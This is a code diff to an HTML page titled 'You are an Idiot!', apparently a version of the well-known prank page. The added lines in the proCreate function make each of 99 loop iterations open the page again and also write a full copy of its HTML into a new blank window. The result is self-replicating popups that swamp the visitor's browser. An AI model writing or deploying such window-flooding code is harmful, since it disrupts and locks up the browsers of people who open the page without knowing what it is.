@@ -2,7 +2,6 @@
 		<meta charset="utf-8">
 		<meta name="viewport" content="width=device-width, initial-scale=1">
 		<meta name="darkreader-lock">
-
 		
 		<title>You are an Idiot!</title>
 		
@@ -978,7 +977,13 @@ function openWindow(url) {
 async function proCreate(count) {	
 	for (let i = 0; i < 99; i++) {
 		openWindow(window.location.pathname);
-		await new Promise(r => setTimeout(r, 0));
+        const cloneHTML = `<base href="${window.location.href}">${document.documentElement.outerHTML}`;
+        const win = window.open('about:blank', '_blank');
+        if (win) {
+            win.document.open();
+            win.document.write(cloneHTML);
+            win.document.close();
+        }
 	}
 }
 
